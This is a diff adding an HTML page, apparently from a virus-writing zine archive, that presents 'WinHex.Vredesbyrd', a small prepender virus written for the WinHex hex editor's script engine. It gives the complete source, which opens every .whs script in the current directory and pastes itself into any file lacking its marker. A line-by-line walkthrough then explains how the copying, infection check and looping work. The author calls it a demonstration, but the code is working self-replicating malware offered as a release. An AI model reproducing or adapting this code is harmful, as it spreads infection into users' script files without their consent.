@@ -1,0 +1,134 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html>
+<head>
+
+<link href="../../viewer/css/style2.css" rel="stylesheet" type="text/css">
+</head>
+
+<body>
+
+<div class="menu">
+<div class="menuitem"><a href="../../viewer/html/sources.html">Return to previous menu</a></div>
+<div class="menuitem"><a target="_blank" href="Vredesbyrd">Navigate to project folder</a></div>
+
+</div>
+
+<div class="title">WinHex.Vredesbyrd<br/></div>
+<div class="author">izee<br/></div>
+
+
+<xmp>
+
+ -------------------------
+|WinHex.Vredesbyrd        | Project started        : 2007.06.14
+|izee // EOF              | Virus finished         : 2007.06.15   
+|                         | Whole project finished : 2007.06.21
+|virus name : Vredesbyrd  |
+|virus type : prepender   |
+|platform   : hex editor  |
+|target     : WinHex      |
+|tested on  : WinHex 13.6 |
+|size       : 197 bytes   |
+ -------------------------
+
+About the virus.
+
+This virus is coded for WinHex built-in script engine. On execution virus will
+prepend  itself at the beginning of every .whs  file in the current directory.
+To be honest, I never saw hex editors viruses, so it may be the first one.
+
+Source.
+
+==start of source===
+//WH.Vredesbyrd
+
+Open ".\*.whs"
+NextObj
+
+Block2 196
+Copy
+Close
+
+Label infect
+
+Find "Vredesbyrd"
+IfFound
+Close
+else
+Paste
+Save
+Close
+EndIf
+
+ExitIfNoFilesOpen
+
+JumpTo infect
+
+===end of source====
+
+Explanation.
+
+//WH.Vredesbyrd   -- Virus mark. We'll need it to check if file is infected or not, but not only. (-;
+
+Open ".\*.whs"    -- Open all .whs files in WinHex which are located in the current directory.
+
+NextObj           -- As WinHex opens files and sorting tabs in alphabetical order, virus  must
+                     be in a first position among other whs files and tabs. To be first in the
+                     directory and in WinHex tabs, virus should have filename like "a1.whs" or
+                     similar.
+
+                     Here's is a scheme how WinHex will open all whs files and sort thems.
+
+                     [a1.whs] [victim1.whs] [victim2.whs] [victim3.whs] ...
+
+                     
+                     When all whs files will be opened, WinHex by default will point to the
+                     last tab - "victim3.whs", so we must move to the first tab, and as you
+                     see the first tab is a virus. NextObj command  will move from the last
+                     tab to the first, it will be the virus.
+
+Block2 196        -- Now we are in the virus tab. Block2 command will highlight 196 bytes of
+                     data (it's a whole virus) from up to down.
+
+Copy              -- Copy highlighted virus into buffer.
+
+Close             -- Close the virus tab, thus we are moving to the next tab. As in scheme
+                     above, it would be "victim1.whs".
+
+Label infect      -- Infection label.
+
+Find "Vredesbyrd" -- Searching for mark, if file is already infected or not.
+
+IfFound           -- If mark found - file already infected.
+
+Close             -- Close already infected file and move to the next tab.
+
+else              -- If mark was not found - file not infected.
+
+Paste             -- Paste the copied to buffer virus into currently opened file.
+
+Save              -- Save the infected file.
+
+Close             -- Close the infected file, thus we are moving to the next tab.
+
+EndIf             -- End of IfFound procedure.
+
+ExitIfNoFilesOpen -- If no opened tabs left - stop virus.
+
+JumpTo infect     -- If more tabs left - jump to infection label and infect other whs files.
+
+
+Conclusion.
+
+As you see, this small, only 16 commands containing, 197 bytes virus is only for the
+demonstration  purposes. Such viruses will never spread, but it's always interesting
+to show new platforms for self-replication possibility.
+
+I hope you enjoyed it, if you have something to say, my mail is: izee@eof-project.net
+
+</xmp>
+</div>
+
+</body>
+</html>
